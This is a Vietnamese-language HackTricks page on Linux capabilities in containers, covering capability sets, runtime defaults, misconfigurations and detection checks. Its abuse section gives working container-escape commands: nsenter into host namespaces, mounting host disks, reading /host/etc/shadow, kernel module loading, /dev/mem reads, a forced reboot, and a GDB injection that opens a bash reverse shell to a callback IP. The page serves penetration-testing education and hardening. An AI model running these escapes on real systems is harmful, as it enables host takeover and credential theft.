# Linux Capabilities Trong Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Tổng quan

Linux capabilities là một trong những thành phần quan trọng nhất của bảo mật container vì chúng trả lời một câu hỏi tinh tế nhưng cơ bản: **"root" thực sự có nghĩa là gì bên trong một container?** Trên hệ thống Linux thông thường, UID 0 theo truyền thống hàm ý một tập hợp quyền rất rộng. Trong các kernel hiện đại, những quyền đó được chia thành các đơn vị nhỏ hơn gọi là capabilities. Một process có thể chạy với quyền root nhưng vẫn thiếu nhiều thao tác mạnh nếu các capabilities tương ứng đã bị loại bỏ. <sup>[[1]](#references)</sup>

Containers phụ thuộc nhiều vào sự phân biệt này. Nhiều workload vẫn được khởi chạy với UID 0 bên trong container vì lý do tương thích hoặc đơn giản. Nếu không loại bỏ capabilities, điều đó sẽ quá nguy hiểm. Khi đã loại bỏ capabilities, một process root trong container vẫn có thể thực hiện nhiều tác vụ thông thường bên trong container, đồng thời bị ngăn thực hiện các thao tác nhạy cảm hơn của kernel. Vì vậy, một shell trong container hiển thị `uid=0(root)` không tự động có nghĩa là "root trên host" hay thậm chí là "có quyền kernel rộng". Các tập capability quyết định danh tính root đó thực sự có quyền đến mức nào.

Để xem tài liệu tham khảo đầy đủ về Linux capabilities và nhiều ví dụ về cách lạm dụng, hãy xem:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Cách hoạt động

Capabilities được theo dõi trong một số tập, bao gồm permitted, effective, inheritable, ambient và bounding. Với nhiều đánh giá container, ngữ nghĩa chính xác của từng tập trong kernel không quan trọng bằng câu hỏi thực tế cuối cùng: **process này hiện có thể thực hiện thành công những thao tác đặc quyền nào, và còn có thể đạt được những đặc quyền nào trong tương lai?** <sup>[[1]](#references)</sup>

Điều này quan trọng vì nhiều kỹ thuật breakout thực chất là vấn đề về capability được ngụy trang thành vấn đề về container. Một workload có `CAP_SYS_ADMIN` có thể truy cập rất nhiều chức năng kernel mà một process root thông thường trong container không nên chạm tới. Một workload có `CAP_NET_ADMIN` sẽ nguy hiểm hơn nhiều nếu nó cũng chia sẻ network namespace của host. Một workload có `CAP_SYS_PTRACE` sẽ đáng chú ý hơn nhiều nếu nó có thể nhìn thấy các process trên host thông qua việc chia sẻ PID của host. Trong Docker hoặc Podman, cấu hình này có thể xuất hiện dưới dạng `--pid=host`; trong Kubernetes, thường là `hostPID: true`.

Nói cách khác, không thể đánh giá tập capability một cách riêng lẻ. Cần xem xét nó cùng với namespaces, seccomp và chính sách MAC.

## Lab

Một cách rất trực tiếp để kiểm tra capabilities bên trong container là:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Bạn cũng có thể so sánh một container bị giới hạn nghiêm ngặt hơn với một container được thêm tất cả capabilities:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Để thấy tác động của việc chỉ bổ sung một phạm vi hẹp, hãy thử loại bỏ tất cả rồi chỉ thêm lại một capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Những thử nghiệm nhỏ này giúp cho thấy runtime không chỉ bật/tắt một boolean có tên "privileged". Nó định hình bề mặt đặc quyền thực tế mà tiến trình có thể sử dụng.

## Capabilities rủi ro cao

Capabilities chỉ trở thành primitive escape khi thao tác của chúng tác động đến **tài nguyên do host kiểm soát**. Các tổ hợp rủi ro cao thường gặp là:

- **`CAP_SYS_ADMIN`** cùng với PID của host, thiết bị khối hoặc đường dẫn điều khiển kernel có quyền ghi. Để tham gia mount namespace mục tiêu, cần thêm `CAP_SYS_CHROOT`; để mount filesystem dựa trên thiết bị khối, cần `CAP_SYS_ADMIN` trong user namespace ban đầu.
- **`CAP_SYS_PTRACE`** cùng với khả năng nhìn thấy PID của host và một tiến trình trên host có thể attach. Không cần `CAP_SYS_ADMIN` để inject qua ptrace.
- **`CAP_DAC_OVERRIDE` hoặc `CAP_DAC_READ_SEARCH`** cùng với filesystem của host có thể truy cập. Các capability này bỏ qua những kiểm tra DAC khác nhau nhưng không tạo ra góc nhìn filesystem của host.
- **`CAP_SYS_MODULE`** trong user namespace ban đầu cùng với một module được chấp nhận và tương thích với kernel. Các Linux container thông thường dùng chung kernel của node; runtime VM hoặc userspace-kernel thay đổi ranh giới này.
- **`CAP_MKNOD`** trong user namespace ban đầu cùng với một thiết bị thực trên host mà device cgroup đã cho phép. Tạo node không vượt qua device cgroup.
- **`CAP_SYS_RAWIO`** cùng với giao diện bộ nhớ, cổng I/O, PCI hoặc điều khiển thiết bị được expose và có thể sử dụng.
- **`CAP_SYS_BOOT`** cùng với PID namespace ban đầu để reboot host, hoặc một đường dẫn kexec có thể sử dụng và được cho phép để thay kernel.
- **`CAP_NET_ADMIN`** trong network namespace của host để trực tiếp kiểm soát trạng thái mạng của node. **`CAP_NET_RAW`** có thể tham gia vào một escape đặc thù giao thức, nhưng chỉ có raw socket thì không tạo được shell trên node.

Cố ý không liệt kê `CAP_SYS_CHROOT` như một capability escape độc lập. Capability này có thể cần thiết cho `setns()` vào mount namespace và có thể giúp sử dụng cây thư mục của host đã truy cập được, nhưng riêng `chroot()` không làm lộ cây thư mục đó hay cấp thêm quyền filesystem. Tương tự, `CAP_BPF` và `CAP_PERFMON` mở ra bề mặt telemetry và kernel mạnh mẽ, nhưng nếu không có lỗ hổng kernel riêng thì các thao tác thông thường của chúng không phải là cách escape container chung.

## Cách runtime sử dụng

Docker, Podman, các stack dựa trên containerd và CRI-O đều sử dụng cơ chế kiểm soát capability, nhưng mặc định và giao diện quản lý khác nhau. Docker cho phép cấu hình trực tiếp qua các flag như `--cap-drop` và `--cap-add`. Podman có các tùy chọn tương tự và thường kết hợp chúng với việc chạy rootless như một lớp an toàn bổ sung. Kubernetes cho phép thêm và loại bỏ capability thông qua `securityContext` của Pod hoặc container; các runtime cấp thấp hơn biểu diễn các tập kết quả trong cấu hình runtime OCI. Các môi trường system-container như LXC và Incus cũng dựa vào cơ chế kiểm soát capability, nhưng khả năng tích hợp sâu hơn với host có thể khiến operator nới lỏng cấu hình mặc định mạnh tay hơn so với khi chạy application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Nguyên tắc này áp dụng cho tất cả các môi trường trên: một capability có thể được cấp về mặt kỹ thuật không có nghĩa là nên cấp nó. Nhiều sự cố ngoài thực tế bắt đầu khi operator thêm capability chỉ vì workload không chạy được với cấu hình nghiêm ngặt hơn và nhóm cần một cách khắc phục nhanh.

## Cấu hình sai

Sai lầm dễ thấy nhất là dùng **`--cap-add=ALL`** trong CLI kiểu Docker/Podman, nhưng đó không phải là sai lầm duy nhất. Trên thực tế, vấn đề thường gặp hơn là cấp một hoặc hai capability cực kỳ mạnh, đặc biệt là `CAP_SYS_ADMIN`, để "làm cho ứng dụng hoạt động" mà không tìm hiểu các tác động liên quan đến namespace, seccomp và mount. Một lỗi phổ biến khác là kết hợp thêm capability với việc chia sẻ namespace của host. Trong Docker hoặc Podman, điều này có thể xuất hiện dưới dạng `--pid=host`, `--network=host` hoặc `--userns=host`; trong Kubernetes, mức độ expose tương đương thường xuất hiện qua các thiết lập workload như `hostPID: true` hoặc `hostNetwork: true`. Mỗi tổ hợp này đều thay đổi những gì capability thực sự có thể tác động đến.

Quản trị viên cũng thường cho rằng workload chưa chạy với `--privileged` thì vẫn bị giới hạn đáng kể. Đôi khi điều đó đúng, nhưng đôi khi cấu hình thực tế đã gần với privileged đến mức khác biệt này không còn ý nghĩa trong vận hành.

## Lạm dụng

Trước tiên, hãy ghi lại các tập quyền hiệu lực, ánh xạ user namespace, trạng thái seccomp, namespace, mount và thiết bị. Tên capability nếu thiếu ngữ cảnh này không chứng minh được có escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces và thiết bị khối

Khi nhìn thấy PID của host, `CAP_SYS_ADMIN` có thể vào các namespace của host. Thao tác với mount namespace cũng cần `CAP_SYS_CHROOT` trong user namespace của tiến trình gọi.

**Kiểm tra capability và cơ chế hạn chế:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Liệt kê mục tiêu:** xác nhận chia sẻ PID của host từ cấu hình container/Pod hoặc từ danh sách tiến trình host không thể nhầm lẫn, sau đó kiểm tra các namespace của mục tiêu. PID 1 cục bộ cũng tồn tại trong các PID namespace riêng tư, nên chỉ sự hiện diện của nó không chứng minh được việc chia sẻ PID của host.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Khai thác đường dẫn namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Các kiểm tra capability phải thành công trong user namespace sở hữu các mục tiêu. `--pid=host` hoặc `hostPID: true` trong Kubernetes giúp nhìn thấy chúng; chúng không cấp capability.

Đối với phương án dùng block device, hãy **enumerate** các mục có thể, sau đó **exploit** filesystem có thể truy cập bằng cách trước tiên mount mục đã xác thực ở chế độ chỉ đọc:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Device node phải tồn tại, device cgroup phải cho phép nó, và các mount block filesystem cần `CAP_SYS_ADMIN` trong user namespace ban đầu. Host root đã được bind-mount tại `/host` đồng nghĩa với quyền truy cập host **mà không cần** `CAP_SYS_ADMIN`; `chroot /host` chỉ là tiện ích và cần riêng `CAP_SYS_CHROOT`.

### Host root có thể truy cập: thực thi trực tiếp từ filesystem

Nếu host root đã được mount tại `/host`, trước tiên hãy xác nhận mount, sau đó sử dụng trực tiếp quyền truy cập hiện có. Cách này không phụ thuộc vào `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Nếu `chroot()` không khả dụng nhưng binary của host tương thích với kiến trúc và loader của container, thường có thể gọi nó thông qua cây đã mount:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Đọc và ghi trực tiếp trong `/host` đã đồng nghĩa với việc xâm phạm filesystem của host. `chroot()` hoặc thực thi binary của host chỉ giúp truy cập thuận tiện hơn; cả hai thao tác đều không tạo mount của host hay vượt qua mount chỉ đọc hoặc chính sách MAC.

### `CAP_SYS_PTRACE`: inject vào process của host

Khi có thể nhìn thấy PID của host và có `CAP_SYS_PTRACE` trong user namespace của mục tiêu, GDB có thể khiến một process được phép của host gọi `system()`. Không cần `CAP_SYS_ADMIN`.

**Kiểm tra capability và các biện pháp kiểm soát việc attach:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Liệt kê và chọn một tiến trình mục tiêu có thể loại bỏ:** xác nhận việc chia sẻ PID của host qua cấu hình hoặc danh sách tiến trình node không thể nhầm lẫn; không bao giờ chọn PID 1 hoặc daemon trọng yếu.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Khai thác tiến trình đã chọn:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Tiến trình đích phải cho phép attach và có symbol `system()` cùng đường dẫn Bash payload khả dụng. Yama, trạng thái không thể dump, seccomp, user namespaces và chính sách MAC có thể chặn chuỗi này. GDB dừng tiến trình đích khi attach, vì vậy chỉ sử dụng tiến trình lab có thể loại bỏ.

### `CAP_DAC_OVERRIDE` và `CAP_DAC_READ_SEARCH`: các tệp host được bảo vệ

Các capability này không làm lộ filesystem của host. Nếu `/host` đã là một host mount, `CAP_DAC_READ_SEARCH` có thể bỏ qua các kiểm tra DAC về đọc/tìm kiếm, còn `CAP_DAC_OVERRIDE` cũng có thể bỏ qua các kiểm tra ghi thông thường:

**Kiểm tra các capability:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Liệt kê hệ thống tệp máy chủ bị phơi bày và quyền truy cập mục tiêu:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Thử nghiệm các bypass quyền đọc và ghi** trong một môi trường lab dùng một lần:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Mount ở chế độ chỉ đọc và các quy tắc LSM vẫn được áp dụng. `CAP_DAC_READ_SEARCH` cũng cho phép gọi `open_by_handle_at()`, nhưng để thoát container như trong Shocker, còn cần file descriptor của một mount thuộc cùng filesystem nền, các handle hợp lệ hoặc có thể tìm ra, bố cục filesystem/lưu trữ tương thích, đồng thời không bị runtime hay LSM chặn. Quyền này không cho phép truy cập tùy ý vào mọi filesystem bên ngoài mount namespace.

### `CAP_SYS_MODULE`: thực thi trong kernel dùng chung

Trong một Linux container thông thường, module được chấp nhận sẽ chạy trong kernel dùng chung của host.

**Kiểm tra capability và phạm vi user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các điều kiện tiên quyết để tải module:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit chỉ bằng proof module tương thích, được rà soát trước, trên node dùng một lần:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability phải có hiệu lực trong user namespace ban đầu. Phiên bản và cấu hình kernel, chữ ký module, lockdown, seccomp và chính sách LSM phải cho phép tải module. Kata, gVisor, Hyper-V isolation và các runtime tương tự làm thay đổi ranh giới kernel mà workload tiếp cận.

### `CAP_MKNOD`: tạo device handle được phép

`CAP_MKNOD` tạo device node nhưng không bỏ qua device cgroup. Việc tạo device không được namespaced, vì vậy capability phải có hiệu lực trong user namespace ban đầu.

**Kiểm tra capability và phạm vi user namespace:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các thiết bị thực tế, số major/minor của chúng và mọi allowlist cgroup-v1 hiển thị:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Khai thác một ứng viên thuộc họ ext đã được xác thực theo chế độ chỉ đọc:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Các filesystem khác cần một công cụ chỉ đọc tương ứng; để mount thiết bị cũng cần `CAP_SYS_ADMIN`. Lỗi `Operation not permitted` khi mở node vừa tạo thường cho biết device cgroup vẫn chặn thao tác này. Với cgroup v2, quyền truy cập thiết bị thường được thực thi bằng BPF và không có tệp `devices.list`, vì vậy mở thành công là phép thử mang tính quyết định.

### `CAP_SYS_RAWIO`: giao diện raw I/O bị lộ

Không có payload tổng quát nào có thể dùng trên mọi hệ thống: địa chỉ hợp lệ và tác động phụ thuộc vào phần cứng và cấu hình kernel.

**Kiểm tra capability và phạm vi user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các giao diện thô, phần cứng và trình điều khiển bị phơi lộ:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Chỉ exploit khi có proof được phê duyệt cho thiết bị và dải địa chỉ đã xác định.** Nếu `/dev/mem` là giao diện được phòng lab phê duyệt, template này chứng minh khả năng tiết lộ bộ nhớ của node mà không in nội dung của nó:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Địa chỉ phải lấy từ sơ đồ phần cứng của lab vì việc đọc một số vùng MMIO có thể gây tác dụng phụ. Một lệnh ghi bộ nhớ chung chung sẽ gây hiểu nhầm và không an toàn: cùng một địa chỉ có thể vô hại trên máy này nhưng lại điều khiển phần cứng hoặc bộ nhớ kernel trên máy khác. Device cgroups, quyền hệ thống tệp, `/dev/mem` bị giới hạn nghiêm ngặt, kernel lockdown, ảo hóa và chính sách LSM thường ngăn cản việc truy cập hữu ích.

### `CAP_SYS_BOOT`: khởi động lại namespace hoặc thay thế kernel

Trong PID namespace riêng, `reboot()` chấm dứt tiến trình init của namespace đó thay vì khởi động lại host. Vì vậy, để ảnh hưởng đến việc khởi động lại host cần có initial PID namespace, thường thông qua chia sẻ PID của host. Đường dẫn kexec cũng cần ảnh kernel tương thích và chính sách lockdown/chữ ký cho phép:

**Kiểm tra capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liệt kê các điều kiện tiên quyết cho PID namespace và kexec:** xác nhận workload chia sẻ PID với host qua cấu hình workload, vì chỉ riêng liên kết đến PID namespace không cho biết đó có phải namespace ban đầu của node hay không.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Chỉ khai thác khi khởi động lại một nút lab dùng một lần là bài tập được nêu rõ:**

```bash
sync
reboot -f
```

Không chạy lệnh đó hoặc nạp kernel trên node dùng chung chỉ để chứng minh capability. Trong PID namespace riêng, lệnh này chỉ kết thúc tiến trình init của namespace đó và không chứng minh được ảnh hưởng lên host.

### `CAP_NET_ADMIN` và `CAP_NET_RAW`: các đường truy cập mạng của host

`CAP_NET_ADMIN` chỉ ảnh hưởng đến network namespace hiện tại.

**Kiểm tra các capability và mức độ cô lập:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Liệt kê mạng hiện tại và xác nhận cấu hình mạng host từ cấu hình workload:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Thử nghiệm `CAP_NET_ADMIN` theo cách có thể đảo ngược:** khi dùng host networking, interface tạm thời là interface của node.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` cho phép tạo socket RAW và PACKET nhưng không phải là shell host đa dụng. Để **liệt kê** chuỗi GCE đã được ghi nhận, hãy kiểm tra route metadata và ghi nhận liệu lưu lượng guest-agent dạng plaintext có thể quan sát được hay không:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Nếu có đủ các điều kiện tiên quyết tương ứng, **exploit** chuỗi tấn công đặc thù môi trường như được mô tả trong [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): ghi lại request và trạng thái sequence, chèn phản hồi metadata giả mạo có chứa SSH key, sau đó xác minh quyền truy cập host. Chuỗi này yêu cầu quyền root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, lưu lượng metadata GCE ở dạng plaintext và request từ guest agent có thể khai thác race condition; hành vi của transport hoặc agent hiện đại có thể khiến chuỗi này không hoạt động.

## Checks

Mục tiêu của các bước kiểm tra capability không chỉ là lấy các giá trị thô mà còn để xác định liệu process có đủ quyền khiến tình trạng namespace và mount hiện tại trở nên nguy hiểm hay không.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Điều gì đáng chú ý ở đây:

- `capsh --print` là cách dễ nhất để phát hiện các capability có rủi ro cao như `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` hoặc `cap_sys_module`.
- Dòng `CapEff` trong `/proc/self/status` cho biết những gì đang thực sự có hiệu lực, chứ không chỉ những gì có thể có trong các tập khác.
- Kết quả dump capability càng quan trọng nếu container cũng chia sẻ PID namespace, network namespace hoặc user namespace của host, hay có các mount host cho phép ghi.

Sau khi thu thập thông tin capability thô, bước tiếp theo là diễn giải. Hãy xem tiến trình có phải root không, user namespace có đang hoạt động không, các namespace của host có được chia sẻ không, seccomp có đang thực thi không, và AppArmor hoặc SELinux có tiếp tục hạn chế tiến trình không. Bản thân tập capability chỉ là một phần của bức tranh, nhưng thường là phần giải thích vì sao một container breakout thành công còn một container khác lại thất bại dù điểm khởi đầu có vẻ giống nhau.

## Mặc định của runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách làm suy yếu phổ biến |
| --- | --- | --- | --- |
| Docker Engine | Mặc định dùng tập capability đã giảm | Docker giữ một allowlist mặc định gồm các capability và loại bỏ những capability còn lại | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Mặc định dùng tập capability đã giảm | Container của Podman mặc định không có đặc quyền và sử dụng mô hình capability đã giảm | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Kế thừa mặc định của runtime trừ khi được thay đổi | Nếu không chỉ định `securityContext.capabilities`, container sẽ nhận tập capability mặc định từ runtime | `securityContext.capabilities.add`, không đặt `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O trên Kubernetes | Thường là mặc định của runtime | Tập có hiệu lực phụ thuộc vào runtime cùng với cấu hình Pod | Như dòng Kubernetes; cấu hình OCI/CRI trực tiếp cũng có thể thêm capability một cách tường minh |

Đối với Kubernetes, điểm quan trọng là API không xác định một tập capability mặc định chung cho mọi trường hợp. Nếu Pod không thêm hoặc loại bỏ capability, workload sẽ kế thừa mặc định của runtime trên node đó.

## References

- [1] [capabilities(7) - trang hướng dẫn Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - cấu hình container Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Tài liệu Docker - Quyền runtime và Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Tài liệu Kubernetes - Đặt capabilities cho container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Tài liệu Podman - `--cap-add` và `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Tài liệu Incus - Bảo mật](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
